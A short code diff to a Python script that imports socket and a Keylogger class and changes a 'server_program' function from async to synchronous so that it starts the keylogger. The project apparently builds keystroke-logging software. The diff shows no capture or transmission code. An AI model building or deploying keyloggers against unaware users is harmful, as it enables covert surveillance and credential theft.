@@ -31,11 +31,10 @@
 
 import socket
 from Keylogger import Keylogger
-import asyncio
 
-async def server_program():
+def server_program():
     keylogger = Keylogger()
-    await keylogger.start()
+    keylogger.start()
 
 if __name__ == '__main__':
     server_program()
